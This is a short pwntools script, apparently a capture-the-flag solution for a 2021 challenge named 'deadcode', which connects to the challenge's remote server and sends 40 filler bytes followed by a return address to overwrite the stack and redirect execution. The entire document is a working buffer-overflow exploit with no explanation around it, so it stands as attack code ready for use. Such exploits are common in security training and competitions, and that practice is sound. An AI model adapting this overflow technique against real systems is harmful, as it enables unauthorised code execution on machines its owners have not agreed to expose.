from pwn import *
#p = process('./deadcode')
p = remote("pwn-2021.duc.tf", 31916)

dead = 0x4011E3
buf = b"A" * 40
buf += p64(dead)

print(p.recvuntil("app?"))
p.sendline(buf)

print(p.recv())
p.interactive()